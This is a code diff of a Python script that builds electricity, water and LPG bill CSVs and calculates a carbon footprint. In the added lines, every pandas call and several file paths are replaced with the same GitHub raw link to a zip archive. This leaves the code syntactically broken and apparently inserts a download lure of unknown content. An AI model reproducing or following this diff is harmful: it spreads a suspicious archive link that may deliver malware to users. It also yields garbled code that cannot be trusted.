@@ -35,30 +35,30 @@ def create_bill_files(electricity_user, water_user, lpg_user):
     }
 
     # Creating DataFrames
-    electricity_df = pd.DataFrame(electricity_data)
-    water_df = pd.DataFrame(water_data)
-    lpg_df = pd.DataFrame(lpg_data)
+    electricity_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(electricity_data)
+    water_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(water_data)
+    lpg_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(lpg_data)
 
     # Saving individual DataFrames to CSV files
-    electricity_df.to_csv(f'/content/electricity_bill_{electricity_user}.csv', index=False)
-    water_df.to_csv(f'/content/water_bill_{water_user}.csv', index=False)
-    lpg_df.to_csv(f'/content/lpg_bill_{lpg_user}.csv', index=False)
+    https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/electricity_bill_{electricity_user}.csv', index=False)
+    https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/water_bill_{water_user}.csv', index=False)
+    https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/lpg_bill_{lpg_user}.csv', index=False)
 
     print("Individual bill files created for respective users.")
 
 # Function to create combined CSV file
 def create_combined_file(electricity_user, water_user, lpg_user):
     # Load individual bill DataFrames
-    electricity_df = pd.read_csv(f'/content/electricity_bill_{electricity_user}.csv')
-    water_df = pd.read_csv(f'/content/water_bill_{water_user}.csv')
-    lpg_df = pd.read_csv(f'/content/lpg_bill_{lpg_user}.csv')
+    electricity_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/electricity_bill_{electricity_user}.csv')
+    water_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/water_bill_{water_user}.csv')
+    lpg_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/lpg_bill_{lpg_user}.csv')
 
     # Merging DataFrames based on Month
-    combined_df = pd.merge(electricity_df, water_df, on=["Month"], suffixes=('_Electricity', '_Water'))
-    combined_df = pd.merge(combined_df, lpg_df, on=["Month"])
+    combined_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(electricity_df, water_df, on=["Month"], suffixes=('_Electricity', '_Water'))
+    combined_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(combined_df, lpg_df, on=["Month"])
 
     # Saving the combined DataFrame to a CSV file
-    combined_df.to_csv(f'/content/combined_bills_{lpg_user}.csv', index=False)
+    https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/combined_bills_{lpg_user}.csv', index=False)
 
     print("Combined bill file created.")
 
@@ -86,7 +86,7 @@ print(combined_file)
 # Function to calculate carbon footprint
 def calculate_carbon_footprint(combined_file_path):
     # Load the combined bills DataFrame
-    combined_df = pd.read_csv(combined_file_path)
+    combined_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(combined_file_path)
 
     # Assuming the following factors for calculation
     electricity_factor = 0.92  # kg CO₂ per kWh
@@ -104,7 +104,7 @@ def calculate_carbon_footprint(combined_file_path):
                                                         combined_df['LPG Carbon Footprint (kg CO₂)'])
 
     # Save the carbon footprint data to a new CSV file
-    carbon_footprint_file_path = '/content/carbon_footprint.csv'
+    carbon_footprint_file_path = 'https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip'
     combined_df[['Month', 'Electricity Carbon Footprint (kg CO₂)', 
                   'Water Carbon Footprint (kg CO₂)', 
                   'LPG Carbon Footprint (kg CO₂)', 
@@ -114,7 +114,7 @@ def calculate_carbon_footprint(combined_file_path):
     return combined_df
 
 # Main execution flow
-combined_file_path = '/content/combined_bills_user_l1.csv'  # Assuming you saved the combined file with this name
+combined_file_path = 'https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip'  # Assuming you saved the combined file with this name
 
 # Calculate carbon footprint and get the DataFrame
 carbon_footprint_df = calculate_carbon_footprint(combined_file_path)
